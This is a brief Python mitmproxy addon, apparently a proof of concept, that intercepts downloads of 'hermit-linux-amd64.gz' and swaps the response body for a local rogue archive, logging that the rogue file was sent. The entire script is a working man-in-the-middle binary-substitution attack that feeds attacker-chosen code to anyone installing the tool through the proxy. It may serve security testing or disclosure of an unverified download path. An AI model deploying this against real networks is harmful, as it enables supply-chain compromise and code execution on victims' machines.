#!/usr/bin/env python3

from mitmproxy import ctx
from mitmproxy import http

flag=False
filename="hermit-linux-amd64.gz"
rogue_filename="test-hermit-linux-amd64.gz"
def response(flow: http.HTTPFlow):
    if filename in flow.request.pretty_url:
        ctx.log.info("Rewriting {}".format(filename))
        with open(rogue_filename,"rb") as f:
            rogueFile=f.read()
        custom_response=http.Response.make(
            200,
            rogueFile,
            {},
        )
        flow.response.content=custom_response.content
        ctx.log.info("rogue file {} sent".format(rogue_filename))